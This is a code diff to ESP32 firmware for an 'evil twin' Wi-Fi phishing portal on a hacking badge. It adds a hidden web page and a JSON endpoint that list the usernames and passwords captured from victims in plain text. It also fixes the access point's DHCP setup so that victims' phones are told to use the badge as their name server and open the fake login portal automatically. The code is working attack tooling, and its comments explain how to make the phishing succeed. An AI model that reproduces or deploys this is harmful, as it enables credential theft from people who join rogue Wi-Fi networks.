@@ -36,6 +36,27 @@ static bool _evilNoteLoaded = false;
 // this number the two cases are indistinguishable from the outside.
 static volatile uint32_t _cpProbes = 0;
 
+// Escape text that a victim typed before putting it in a page. Captured values
+// are attacker-visible but victim-controlled: a submitted username of
+// "<script>..." would otherwise execute in the operator's own browser when the
+// capture list is viewed. Escaping here keeps the viewer safe to open.
+static String htmlEscape(const String &in) {
+  String out;
+  out.reserve(in.length() + 16);
+  for (size_t i = 0; i < in.length(); i++) {
+    char c = in[i];
+    switch (c) {
+      case '&':  out += "&amp;";  break;
+      case '<':  out += "&lt;";   break;
+      case '>':  out += "&gt;";   break;
+      case '"':  out += "&quot;"; break;
+      case '\'': out += "&#39;";  break;
+      default:   out += c;        break;
+    }
+  }
+  return out;
+}
+
 static void evilNote(const String &msg) {
   Serial.println("[MGMT] " + msg);
   _evilNoteCache  = msg;
@@ -255,6 +276,16 @@ void EvilPortal::setupServer() {
   server.on("/connecttest.txt",     [redirect](){ redirect(); }); // Windows 10+
   server.on("/canonical.html",      [redirect](){ redirect(); }); // Ubuntu/GNOME
   server.on("/chat",                [redirect](){ redirect(); }); // Apple (iOS 17+)
+
+  // ── LIVE CAPTURE VIEWER ───────────────────────────────────
+  // Deliberately an unlinked, non-obvious path. This runs on the same AP the
+  // victims are joined to, so anyone who reached this URL would read everyone
+  // else's captures: it is obscurity, not access control, and it must stay off
+  // the portal page and out of the redirect list above.
+  server.on("/pwnterrey-creds", HTTP_GET, [this]() { this->serveCredsPage(); });
+  server.on("/pwnterrey-creds.json", HTTP_GET, [this]() {
+    mgmtServeFile("/captures.json", "application/json; charset=utf-8");
+  });
 
   // ── REDIRECT ROOT → PORTAL ────────────────────────────────
   server.on("/", [this]() {
@@ -780,6 +811,119 @@ void EvilPortal::flushCapturedCreds() {
   #ifdef HAS_SCREEN
     this->sendToDisplay("Data Hashed & Saved");
   #endif
+}
+
+// Live capture viewer. Served on the evil AP itself so captures can be read
+// while the attack is still running, which previously required ending the
+// attack and waiting for the management AP to come back.
+//
+// Sent in chunks rather than built as one String: captures.json is capped at
+// 8 KB and the rendered page is roughly twice that, which is a lot to hold in
+// one allocation on a part with no PSRAM while the web server also needs heap.
+void EvilPortal::serveCredsPage() {
+  String raw = "";
+  if (SPIFFS.exists("/captures.json")) {
+    File f = SPIFFS.open("/captures.json", "r");
+    if (f) {
+      raw = f.readString();
+      f.close();
+    }
+  }
+
+  server.setContentLength(CONTENT_LENGTH_UNKNOWN);
+  server.send(200, "text/html; charset=utf-8", "");
+  server.sendContent(F(
+    "<!DOCTYPE html><html lang=\"es\"><head><meta charset=\"utf-8\">"
+    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
+    "<title>Pwnterrey - Credenciales</title><style>"
+    "body{background:#0d0d12;color:#e8e8ef;font-family:system-ui,-apple-system,sans-serif;"
+    "margin:0;padding:16px}h1{font-size:17px;margin:0 0 2px}"
+    ".sub{color:#8b8b9e;font-size:12px;margin-bottom:14px}"
+    "table{width:100%;border-collapse:collapse;font-size:13px}"
+    "th{text-align:left;color:#8b8b9e;font-weight:600;font-size:10px;letter-spacing:.6px;"
+    "text-transform:uppercase;padding:8px 6px;border-bottom:1px solid #2a2a35}"
+    "td{padding:10px 6px;border-bottom:1px solid #1b1b22;word-break:break-all;vertical-align:top}"
+    ".u{color:#5ac8fa}.p{color:#ff6b6b;font-family:ui-monospace,monospace}"
+    ".m{color:#6b6b80;font-size:11px}"
+    ".e{color:#8b8b9e;text-align:center;padding:48px 16px;font-size:14px;line-height:1.6}"
+    ".n{display:inline-block;background:#1b1b22;border-radius:5px;padding:2px 8px;"
+    "font-size:12px;color:#5ac8fa;margin-left:6px}"
+    "</style></head><body><h1>Credenciales capturadas"));
+
+  // Count first so the total can be shown in the header before the table.
+  // The count applies the same completeness test as the emit loop below: a file
+  // truncated by power loss mid-write leaves a partial entry that cannot be
+  // rendered, and counting it anyway made the header claim a row the table did
+  // not contain.
+  int total = 0;
+  {
+    int i = 0;
+    while (true) {
+      int s = raw.indexOf("{\"user\":\"", i);
+      if (s < 0) break;
+      int ue = raw.indexOf("\",\"pass\":\"", s + 9);
+      if (ue < 0) break;
+      if (raw.indexOf("\",\"user_h\":\"", ue + 10) < 0) break;
+      total++;
+      i = s + 9;
+    }
+  }
+  server.sendContent("<span class=\"n\">" + String(total) + "</span></h1>");
+  server.sendContent(F("<div class=\"sub\">Pwnterrey Badge &middot; se actualiza al recargar</div>"));
+
+  if (total == 0) {
+    server.sendContent(F("<div class=\"e\">Todavia no hay credenciales.<br>"
+                         "Esta pagina se actualiza al recargar.</div>"
+                         "</body></html>"));
+    server.sendContent("");
+    return;
+  }
+
+  server.sendContent(F("<table><tr><th>Usuario</th><th>Password</th><th>Red / seg. desde arranque</th></tr>"));
+
+  // The file is written by flushCapturedCreds() in a fixed shape, so a plain
+  // sequential scan is enough and avoids pulling in a JSON parser.
+  int idx = 0;
+  while (true) {
+    int s = raw.indexOf("{\"user\":\"", idx);
+    if (s < 0) break;
+    int us = s + 9;
+    int ue = raw.indexOf("\",\"pass\":\"", us);
+    if (ue < 0) break;
+    int ps = ue + 10;
+    int pe = raw.indexOf("\",\"user_h\":\"", ps);
+    if (pe < 0) break;
+
+    String u = raw.substring(us, ue);
+    String p = raw.substring(ps, pe);
+
+    String ap = "";
+    int as = raw.indexOf("\",\"ap\":\"", pe);
+    int ae = -1;
+    if (as >= 0) {
+      as += 8;
+      ae = raw.indexOf("\",\"t\":", as);
+      if (ae > 0) ap = raw.substring(as, ae);
+    }
+    String ts = "";
+    int tsi = raw.indexOf("\",\"t\":", pe);
+    if (tsi >= 0) {
+      tsi += 6;
+      int tse = raw.indexOf("}", tsi);
+      if (tse > 0) ts = raw.substring(tsi, tse);
+    }
+
+    server.sendContent("<tr><td class=\"u\">" + htmlEscape(u) +
+                       "</td><td class=\"p\">" + htmlEscape(p) +
+                       "</td><td class=\"m\">" + htmlEscape(ap) +
+                       (ts.length() ? ("<br>" + htmlEscape(ts) + "s") : String("")) +
+                       "</td></tr>");
+
+    idx = (ae > 0 ? ae : pe) + 1;
+  }
+
+  server.sendContent(F("</table></body></html>"));
+  server.sendContent("");
 }
 
 // ── PASSIVE HANDSHAKE CAPTURE (static storage) ────────────────
@@ -2412,56 +2556,62 @@ void EvilPortal::setupManagementServer() {
     // DHCP server: mirror the management path. Without this an associated
     // victim gets no IP and never loads the portal.
     //
-    // A lease on its own is not enough for a phone to OPEN the portal by
-    // itself. iOS and Android judge a network by fetching a known URL
-    // (captive.apple.com, connectivitycheck.gstatic.com) and they can only
-    // reach ours if the lease tells them to use the badge as their name
-    // server. ESP-IDF's DHCP server does NOT advertise one unless OFFER_DNS
-    // is set explicitly, and nothing here ever set it - so every probe went to
-    // whatever resolver the phone already had and never arrived at the badge.
-    // That is exactly why opening 192.168.4.1 by hand showed the portal while
-    // the sheet never appeared on its own: a manual visit needs no lookup.
+    // The lease must also tell the client to use the badge as its name server,
+    // or automatic portal detection cannot work: every OS decides whether a
+    // network is online by fetching a known URL, and it can only ask us about
+    // that URL if we are its resolver. ESP-IDF does not advertise one unless
+    // the OFFER_DNS flag is set, and the only supported way to set it is to
+    // pass a non-zero dns argument to softAPConfig(): see
+    // NetworkInterface::config(), which gates the OFFER_DNS option on exactly
+    // that value being non-zero. The original startAP() path called
+    // softAPConfig() and worked; this handler never called it, which is why
+    // browsing to the badge by hand showed the portal while no device ever
+    // opened it on its own.
+    //
+    // Setting the option by hand was tried and did not work, because the order
+    // matters: the core sets the DNS info BEFORE stopping the DHCP server,
+    // since the value lives in the server's own state and does not survive
+    // being written while it is stopped. Rather than re-derive that sequence,
+    // this now calls the core and lets it do it.
     esp_netif_t *et_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
     if (et_netif) {
+      IPAddress apip = WiFi.softAPIP();
+      // 5th argument is the DNS server handed out in the lease - the whole
+      // point of this call. 4th is the lease start: zero means "AP IP + 1".
+      bool cfg_ok = WiFi.softAPConfig(apip, apip, IPAddress(255, 255, 255, 0),
+                                      IPAddress((uint32_t)0), apip);
+
       bool cp_ok = false;
 #if ESP_IDF_VERSION >= ESP_IDF_VERSION_VAL(5, 4, 2)
       // RFC 8910 (DHCP option 114). iOS 14+ and Android 11+ open the portal
       // straight from this hint without waiting for a probe to fail, so it is
-      // a second and faster path to the same result. Done first because it
-      // stops and restarts DHCP internally, which would otherwise undo the
-      // option set below. Best effort: older clients ignore it and fall back
-      // to the name-server path.
+      // a second and faster path to the same result. After softAPConfig
+      // because it restarts the DHCP server internally.
       cp_ok = WiFi.AP.enableDhcpCaptivePortal();
 #endif
-      esp_netif_dhcps_stop(et_netif);
 
-      // Advertise the badge itself as the name server.
-      esp_netif_dns_info_t et_dns;
-      memset(&et_dns, 0, sizeof(et_dns));
-      et_dns.ip.type = ESP_IPADDR_TYPE_V4;
-      et_dns.ip.u_addr.ip4.addr = static_cast<uint32_t>(WiFi.softAPIP());
-      esp_err_t dns_err = esp_netif_set_dns_info(et_netif, ESP_NETIF_DNS_MAIN, &et_dns);
-
-      // lwip's dhcps_offer_t bit meaning "include a DNS server in the lease"
-      // (OFFER_DNS in dhcpserver.h). Written as a local constant to avoid
-      // pulling an lwip application header into this translation unit.
-      const uint8_t OFFER_DNS_BIT = 0x02;
-      uint8_t et_offer = OFFER_DNS_BIT;
-      esp_err_t off_err = esp_netif_dhcps_option(
-          et_netif, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
-          &et_offer, sizeof(et_offer));
-
-      esp_err_t dh_err = esp_netif_dhcps_start(et_netif);
-
+      // Read the DHCP state back instead of trusting the calls above. offer=2
+      // is OFFER_DNS, which is the single value that decides whether automatic
+      // portal detection can work at all; anything else means it is off and
+      // no client will ever query us.
+      uint8_t offer_rb = 0;
+      esp_netif_dhcps_option(et_netif, ESP_NETIF_OP_GET,
+                             ESP_NETIF_DOMAIN_NAME_SERVER,
+                             &offer_rb, sizeof(offer_rb));
+      esp_netif_dns_info_t dns_rb;
+      memset(&dns_rb, 0, sizeof(dns_rb));
+      esp_netif_get_dns_info(et_netif, ESP_NETIF_DNS_MAIN, &dns_rb);
       esp_netif_dhcp_status_t et_st = ESP_NETIF_DHCP_INIT;
       esp_netif_dhcps_get_status(et_netif, &et_st);
+
       evilNote("Evil Twin DHCP: dhcps=" +
                String(et_st == ESP_NETIF_DHCP_STARTED ? "on" : "OFF") +
-               " dns_offer=" + String(off_err == ESP_OK ? "ok" : "ERR") +
-               " dns_set=" + String(dns_err == ESP_OK ? "ok" : "ERR") +
-               " start=" + String((int)dh_err) +
+               " cfg=" + String(cfg_ok ? "ok" : "ERR") +
+               " offer=" + String((int)offer_rb) +
+               (offer_rb == 2 ? "(DNS ok)" : "(NOT offering DNS!)") +
+               " dns=" + IPAddress(dns_rb.ip.u_addr.ip4.addr).toString() +
                " rfc8910=" + String(cp_ok ? "ok" : "no") +
-               " ip=" + WiFi.softAPIP().toString());
+               " ip=" + apip.toString());
     } else {
       evilNote("Evil Twin WARNING: AP netif handle not found, no DHCP/DNS offer");
     }
@@ -2790,6 +2940,10 @@ void EvilPortal::setupManagementServer() {
   });
 
   // No captive redirect, no /get route: unknown paths get a plain 404
+  // Same viewer on the management panel, so captures survive the attack and
+  // can be reviewed once the panel is reachable again.
+  server.on("/pwnterrey-creds", HTTP_GET, [this]() { this->serveCredsPage(); });
+
   server.onNotFound([this]() {
     server.send(404, "text/plain", "not found");
   });
